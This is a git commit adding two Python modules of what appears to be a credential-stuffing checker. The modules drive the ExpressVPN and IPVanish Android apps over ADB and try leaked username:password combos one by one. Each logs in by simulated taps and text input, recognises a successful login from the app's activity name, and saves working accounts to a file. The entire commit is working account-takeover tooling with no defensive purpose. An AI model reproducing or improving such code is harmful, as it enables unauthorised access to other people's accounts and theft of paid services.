a66f7fde1620837ae77a1ecafd663c0e7d483b22
Roberto Toledo (g3th) <74467654+g3th@users.noreply.github.com>
2022-06-19 18:20:31 +0100

    Add files via upload

---
+++ clients/expressvpn.py
@@ -0,0 +1,78 @@
+#!/usr/bin/python3
+#expressvpn
+
+import modules.header as header
+import os
+import modules.keyevents as keyevents
+import modules.settings	as settings
+import time
+
+def Checker():
+
+		os.system("clear"); header.Checking()
+		ctr=0 
+
+		users=[] 
+		passwords=[] 
+
+		app='com.expressvpn.vpn'
+
+		with open ('/home/user/accounts','r') as accounts:
+
+			for lines in accounts:
+	
+				users.append(lines.split(":")[0])
+		
+				passwords.append(lines.split(":")[1])
+			
+		accounts.close()
+
+		users=list(dict.fromkeys(users))
+		passwords=list(dict.fromkeys(passwords))
+
+		
+
+		while ctr < len(users):
+			
+			keyevents.Power(); keyevents.Menu(); keyevents.StartApp(app);time.sleep(1)
+
+			if ctr == len(users)+1:
+				print("A total of "+str(len(users)-ctr)+" combo is being attempted\n")
+	
+			keyevents.Tap(594,1617)
+
+			settings.device.shell('input text "'+(str(users[ctr]))+'"')
+			keyevents.Tab(1)
+		
+			settings.device.shell('input text "'+(str(passwords[ctr]))+'"')
+			keyevents.Tap(510,940)
+	
+			os.system("clear");header.title()
+			header.Checking()
+			header.UserInfo(len(users)-ctr,users[ctr],passwords[ctr])
+			time.sleep(4)
+	
+			while True:
+		
+				if "HelpDiagnosticsActivity" in str(keyevents.GetActivity()):
+					header.Valid()
+					header.UserInfo(len(users)-ctr,users[ctr],passwords[ctr])
+
+					with open ('/home/user/accounts/valid_acc','a') as final:
+
+						final.write(str(users[ctr])+":"+str(passwords[ctr]))
+						final.close()
+						keyevents.StopApp(app)
+						keyevents.ClearData(app)
+						break
+				else:
+					header.Invalid()
+					header.UserInfo(len(users)-ctr,users[ctr],passwords[ctr])
+					break
+
+			keyevents.StopApp(app)
+			keyevents.Power()
+			ctr +=1
+		return
+
+
---
+++ clients/ipvanish.py
@@ -0,0 +1,81 @@
+#!/usr/bin/python3
+#ipvanish
+
+import modules.header as header
+import modules.settings as settings
+import modules.keyevents as keyevents
+import time
+import os
+
+def Checker():
+	os.system("clear"); header.Checking()
+	ctr=0
+
+	users=[]
+	passwords=[]
+
+	app='com.ixolit.ipvanish'
+
+	with open ('/home/user/accounts','r') as accounts:
+
+		for lines in accounts:
+	
+			users.append(lines.split(":")[0])
+			passwords.append(lines.split(":")[1].split("|")[0])
+		accounts.close()
+	
+	users=list(dict.fromkeys(users))
+	passwords=list(dict.fromkeys(passwords))
+
+	while ctr < len(users):
+
+		keyevents.Power(); keyevents.Menu(); keyevents.StartApp(app)
+		time.sleep(2)
+	
+		keyevents.Tap(555,1628)
+		time.sleep(1)
+	
+		keyevents.Write(users[ctr])
+	
+		keyevents.Tap(228,972); keyevents.Write(passwords[ctr])
+		time.sleep(1)
+	
+		keyevents.Tap(589,1182)
+		time.sleep(4)
+	
+		os.system("clear");header.title()
+		header.Checking()
+		header.UserInfo(len(users)-ctr,users[ctr],passwords[ctr])
+	
+		while True:
+		
+			if "TutorialActivity" in keyevents.GetActivity():
+			
+				keyevents.Tap(566,1230);time.sleep(2)
+		
+			if "MainActivity" in keyevents.GetActivity():
+		
+				header.Valid()
+				header.UserInfo(len(users)-ctr,users[ctr],passwords[ctr])
+			
+				with open ('/home/user/validacc','a') as final:
+			
+					final.write(str(users[ctr])+":"+str(passwords[ctr]+"\n"))
+					final.close()
+					keyevents.StopApp(app)
+					keyevents.ClearData(app)
+					break
+		
+			else:
+			
+				header.Invalid()
+				header.UserInfo(len(users)-ctr,users[ctr],passwords[ctr])
+				break
+	
+		keyevents.StopApp(app)
+		keyevents.Power()
+		ctr +=1
+			
+	return		
+			
+			
